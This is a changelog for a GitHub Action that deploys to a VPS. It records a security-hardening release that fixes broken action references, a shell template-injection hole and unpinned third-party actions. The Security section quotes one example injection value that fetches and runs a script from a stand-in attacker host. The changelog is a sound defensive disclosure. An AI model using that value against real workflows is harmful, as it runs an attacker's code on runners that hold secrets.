# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

## [1.1.0] — 2026-08-07

Security-hardening release. Three defects present in the published `v1.0.0` are
fixed, two of which affected consumers directly.

### Fixed
- **The published action reference was broken.** `README.md`, all six status
  badges, the three example workflows and `requirements.md` told consumers to
  use `mujeeb-enfin/git-actions@v1`. That repository does not exist — the
  correct name is `mujeeb-enfin/deploy-to-vps` — so every copied snippet failed
  with "repository not found" and every badge 404'd. All references corrected.
- **Two scan workflows referenced actions that do not exist**, so neither had
  ever run successfully:
  - `owasp.yml` used `dependency-check/dependency-check-action@v4`; the real
    repository is `dependency-check/Dependency-Check_Action`, whose latest
    release is `1.1.0`.
  - `sonarqube.yml` used `sonarsource/sonarqube-quality-gate-action@v2`; that
    action has never published a v2 — the latest tag is `v1.2.1`.

### Security
- **Fixed a shell template-injection vector in `action.yml`.** The *Build deploy
  summary* step interpolated `${{ inputs.strategy }}`, `${{ inputs.vps_host }}`,
  `${{ inputs.ref }}` and `${{ inputs.dry_run }}` directly into its `run:` block.
  GitHub substitutes those expressions into the script *before* the shell parses
  it, so a caller-supplied value such as
  `x"; curl https://evil.example/s | sh; echo "` would have executed arbitrary
  commands — on a **consumer's** runner, holding **their** secrets. All values
  now pass through `env:` and are referenced as `"$VAR"`. This also makes the
  claim in README §7.1 — that the injection attack is "not possible out of the
  box" — true of the whole action rather than only of the SSH step.
- **Every third-party `uses:` is now pinned to a 40-character commit SHA**, as
  `CONTRIBUTING.md` has always required: `gitleaks-action`,
  `Dependency-Check_Action`, `codeql-action/upload-sarif`, `upload-artifact`,
  `sonarqube-scan-action`, `sonarqube-quality-gate-action` and
  `action-baseline`. A mutable tag can be repointed by whoever controls the
  upstream repository, and that code then runs on every consumer's runner.

### Added
- **Unified PR security gate** (`.github/workflows/pr-security.yml`). Scanners
  never fail; a single reporter collects their output, attributes each finding
  to the developer whose commit last touched the line using `git blame` plus the
  GitHub commits API, posts **one** pull-request comment that `@`-mentions them,
  and sets the verdict. Branch protection now needs one security check instead
  of one per scanner.
- **Self-enforcing repository rules** (`scripts/ci/repo-rules.mjs`) for policies
  `CONTRIBUTING.md` already stated but nothing checked: SHA pinning, shell
  template injection, workflow `permissions:` blocks, `set -euo pipefail`, and
  action input descriptions. A rule the code does not check is a suggestion.
- **AWS WAF linter** (`scripts/ci/waf/waf-lint.mjs`) carrying the documented AWS
  managed-rule limits and checking URLs in shipped documentation — a public
  action's examples are copied verbatim, so they must not teach a request shape
  that fails as a silent 403.
- `docs/SECURITY_CI.md` — runbook covering what blocks a merge, how to suppress
  a false positive properly, and the real limitations of each scanner.
- Unit tests via Node's built-in runner (`node --test`): 26 cases covering
  secret redaction, SARIF normalization, the tiering rule, and the AWS byte
  limits at their exact boundaries.

### Changed
- `gitleaks.yml` and `trivy.yml` no longer trigger on `pull_request`. They
  previously failed pull requests independently, contradicting the unified gate
  and giving two different answers to "is this PR safe?". They keep their push
  and scheduled runs, which is what feeds GitHub code scanning and the README
  badges. Pull-request coverage is unchanged — it now arrives through one
  attributed check.

### Notes
- The security tooling adds **no dependencies**: plain Node ES modules using
  only the standard library, with no `package.json` and no install step. Tooling
  for a security action must not enlarge the supply chain the action exists to
  keep small.
- OWASP Dependency-Check is **advisory** here and finds nothing — a composite
  action has no dependency manifest to analyse. This is documented in
  `docs/SECURITY_CI.md` rather than left to imply coverage that does not exist.

## [1.0.0] — 2026-08-06

### Added
- Multi-strategy deploy (`node-pm2`, `node-docker`, `static`, `custom`) via the `strategy` input.
- `vps_port`, `vps_fingerprint`, `passphrase`, `dry_run`, `pre_deploy_commands`, `skip_install`, `skip_build` inputs.
- Per-strategy inputs: `pm2_app_name`, `install_command`, `build_command`, `compose_file`, `static_source_dir`, `static_output_dir`, `reload_service`, `custom_script`.
- Structured action `outputs`: `deploy_status`, `deployed_ref`, `deployed_at`, `vps_host`, `strategy`, `deploy_duration_seconds`.
- `$GITHUB_STEP_SUMMARY` markdown table summarizing the deploy result.
- CI workflow `.github/workflows/test.yml` running `actionlint`, `yamllint`, and `shellcheck` on every push and PR.
- Security scan workflows: `gitleaks.yml`, `owasp.yml`, `trivy.yml`, `sonarqube.yml`, `zap.yml`.
- `requirements.md` — consolidated developer checklist.
- `LICENSE` (MIT), `SECURITY.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `CODEOWNERS`, `dependabot.yml`, `PULL_REQUEST_TEMPLATE.md`, issue templates.

### Changed
- `appleboy/ssh-action` pinned from `@v1.0.3` to commit SHA `029f5b4aeeeb58fdfe1410a5d17f967dacf36262`.
- README reorganized: badges → What's in This Repo → Quick Start → Strategies → Security & Scans → License → deeper docs.

### Security
- All user-controlled values flow through `env:` to the SSH step; nothing is raw-interpolated into `script:`.
- `set -euo pipefail` is set before any branch.
- `custom_script` security warning documented in README §Security Notes.